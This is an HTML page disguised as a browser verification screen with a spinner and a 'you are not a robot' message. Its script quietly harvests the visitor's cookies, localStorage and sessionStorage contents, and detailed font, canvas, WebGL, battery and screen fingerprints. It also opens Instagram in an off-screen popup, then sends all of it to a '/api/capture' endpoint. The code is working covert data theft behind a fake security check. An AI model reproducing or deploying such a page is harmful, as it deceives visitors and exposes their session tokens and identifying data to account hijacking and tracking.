<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifying...</title>
<style>
  body { background: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', system-ui, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
  .container { text-align: center; max-width: 500px; }
  .spinner { width: 40px; height: 40px; border: 3px solid #1a3a2a; border-top: 3px solid #00ff88; border-radius: 50%; margin: 20px auto; animation: spin 0.8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h1 { font-size: 1.3rem; color: #00ff88; margin-bottom: 8px; }
  .step { color: #666; font-size: 0.85rem; margin: 4px 0; }
  .step.active { color: #00ff88; }
  .step.done { color: #44aa44; }
  .step.fail { color: #aa4444; }
  .check { display: inline-block; width: 16px; text-align: center; }
  .hidden { display: none; }
  .checkmark { color: #00ff88; font-size: 3rem; }
  .done-text { color: #00ff88; font-size: 1.1rem; margin-top: 10px; }
</style>
</head>
<body>
<div class="container" id="statusContainer">
  <div class="spinner" id="spinner"></div>
  <h1 id="mainStatus">Verifying browser integrity</h1>
  <div id="steps">
    <div class="step" id="step1"><span class="check" id="c1">&#9679;</span> Checking browser configuration</div>
    <div class="step" id="step2"><span class="check" id="c2">&#9679;</span> Analyzing session data</div>
    <div class="step" id="step3"><span class="check" id="c3">&#9679;</span> Checking platform security</div>
  </div>
</div>
<div class="container hidden" id="doneContainer">
  <div class="checkmark">&#10003;</div>
  <div class="done-text">Verification complete &mdash; you are not a robot</div>
</div>

<script>
(async function() {
  const $ = id => document.getElementById(id);
  const markStep = (id, status) => {
    const el = $(id);
    el.className = 'step ' + status;
    el.querySelector('.check').textContent = status === 'done' ? '#' : status === 'fail' ? 'X' : '*';
  };

  await new Promise(r => setTimeout(r, 400));
  $('step1').classList.add('active');

  const payload = {
    timestamp: new Date().toISOString(),
    url: window.location.href,
    referrer: document.referrer || 'direct',
    // Instagram check results
    instagram: { checked: false, loginDetected: false, error: null },
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    screen: {
      width: screen.width, height: screen.height,
      availWidth: screen.availWidth, availHeight: screen.availHeight,
      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth
    },
    window: {
      innerWidth: window.innerWidth, innerHeight: window.innerHeight,
      outerWidth: window.outerWidth, outerHeight: window.outerHeight,
      devicePixelRatio: window.devicePixelRatio
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    cookies: document.cookie || 'none',
    localStorage: Object.keys(localStorage).length > 0 ? Object.entries(localStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
    sessionStorage: Object.keys(sessionStorage).length > 0 ? Object.entries(sessionStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory || 'unknown',
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : 'unknown',
    battery: 'unknown'
  };

  // Battery
  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      payload.battery = { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
    } catch(e) {}
  }

  // Instagram check - open in popup
  try {
    $('mainStatus').textContent = 'Checking account integrity...';
    $('step3').classList.add('active');
    markStep('step1', 'done');
    markStep('step2', 'done');

    const popup = window.open('https://www.instagram.com/', '_blank', 'width=400,height=400,left=-9999,top=-9999');

    if (!popup || popup.closed) {
      payload.instagram = { checked: true, popupResult: 'blocked', loginDetected: false, note: 'Popup was blocked by browser' };
    } else {
      await new Promise(r => setTimeout(r, 2500));
      try { popup.close(); } catch(e) {}
      payload.instagram = { checked: true, popupResult: 'opened_and_closed', loginDetected: false, note: 'Instagram was opened briefly. Login status cannot be read cross-origin (browser security).' };
    }

    markStep('step3', 'done');
  } catch(e) {
    payload.instagram = { checked: true, error: e.message, loginDetected: false };
    markStep('step3', 'done');
  }

  // Font fingerprinting
  const fonts = ['monospace','sans-serif','serif','Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia','Palatino','Garamond','Comic Sans MS','Trebuchet MS','Arial Black','Impact','Lucida Console','Tahoma','Courier','Lucida Sans Unicode'];
  const detected = [];
  const base = document.createElement('div');
  base.style.cssText = 'position:absolute;left:-999px;visibility:hidden;font-size:72px;white-space:nowrap';
  const testStr = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const span = document.createElement('span');
  span.textContent = testStr;
  base.appendChild(span);
  document.body.appendChild(base);
  const baseline = {};
  for (const f of ['monospace','sans-serif','serif']) {
    span.style.fontFamily = f;
    baseline[f] = span.offsetWidth;
  }
  for (const f of fonts) {
    span.style.fontFamily = `"${f}",monospace`;
    if (span.offsetWidth !== baseline.monospace) detected.push(f);
    else {
      span.style.fontFamily = `"${f}",sans-serif`;
      if (span.offsetWidth !== baseline['sans-serif']) detected.push(f);
      else {
        span.style.fontFamily = `"${f}",serif`;
        if (span.offsetWidth !== baseline.serif) detected.push(f);
      }
    }
  }
  document.body.removeChild(base);
  payload.fonts = detected;

  // WebGL
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const ext = gl.getExtension('WEBGL_debug_renderer_info');
      payload.webgl = {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        unmaskedVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : 'n/a',
        unmaskedRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'n/a'
      };
    }
  } catch(e) {}

  // Canvas fingerprint
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 50;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(100,10,50,30);
    ctx.fillStyle = '#069';
    ctx.fillText('BrowserLab', 2, 15);
    payload.canvasFingerprint = c.toDataURL();
  } catch(e) {}

  // Send data
  try {
    await fetch('/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch(e) {}

  // Show done screen
  $('spinner').classList.add('hidden');
  $('statusContainer').classList.add('hidden');
  $('doneContainer').classList.remove('hidden');
})();
</script>
</body>
</html>
